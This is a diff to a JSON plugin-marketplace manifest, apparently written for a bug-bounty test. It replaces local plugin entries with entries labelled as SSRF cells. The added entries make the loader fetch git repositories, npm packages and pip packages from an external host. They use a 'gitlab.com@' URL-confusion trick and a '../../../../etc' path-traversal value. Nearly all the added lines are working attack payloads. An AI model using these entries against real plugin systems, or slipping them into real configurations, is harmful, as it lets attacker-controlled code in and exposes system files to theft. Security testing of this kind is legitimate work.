@@ -10,34 +10,69 @@
       "source": "./plugins/p-ok"
     },
     {
-      "name": "p-paths",
-      "description": "h1 manifest path cell",
-      "source": "./plugins/p-paths"
-    },
-    {
-      "name": "p-r1",
-      "description": "h1 relative symlink cell",
-      "source": "./plugins/p-r1"
-    },
-    {
       "name": "p-r2",
       "description": "h1 relative symlink cell",
       "source": "./plugins/p-r2"
     },
     {
-      "name": "p-r3",
-      "description": "h1 relative symlink cell",
-      "source": "./plugins/p-r3"
+      "name": "s-url",
+      "description": "h1 ssrf cell",
+      "source": {
+        "source": "url",
+        "url": "https://78-135-87-113.sslip.io/s-url.git"
+      }
     },
     {
-      "name": "p-r4",
-      "description": "h1 relative symlink cell",
-      "source": "./plugins/p-r4"
+      "name": "s-subdir",
+      "description": "h1 ssrf cell",
+      "source": {
+        "source": "git-subdir",
+        "url": "https://78-135-87-113.sslip.io/s-subdir.git",
+        "path": "p"
+      }
     },
     {
-      "name": "p-r5",
-      "description": "h1 relative symlink cell",
-      "source": "./plugins/p-r5"
+      "name": "s-urlgl",
+      "description": "h1 ssrf cell",
+      "source": {
+        "source": "url",
+        "url": "https://gitlab.com@78-135-87-113.sslip.io/s-urlgl.git"
+      }
+    },
+    {
+      "name": "s-gh",
+      "description": "h1 cell github repo",
+      "source": {
+        "source": "github",
+        "repo": "anthropics/claude-plugins-official"
+      }
+    },
+    {
+      "name": "s-ghpath",
+      "description": "h1 ssrf cell",
+      "source": {
+        "source": "git-subdir",
+        "url": "https://github.com/merturl4576/h1-test-mp-738798.git",
+        "path": "../../../../etc"
+      }
+    },
+    {
+      "name": "s-npm",
+      "description": "h1 cell",
+      "source": {
+        "source": "npm",
+        "package": "h1-nonexistent-pkg-738798",
+        "registry": "https://78-135-87-113.sslip.io/npm"
+      }
+    },
+    {
+      "name": "s-pip",
+      "description": "h1 cell",
+      "source": {
+        "source": "pip",
+        "package": "h1-nonexistent-pkg-738798",
+        "index_url": "https://78-135-87-113.sslip.io/pip"
+      }
     }
   ]
 }
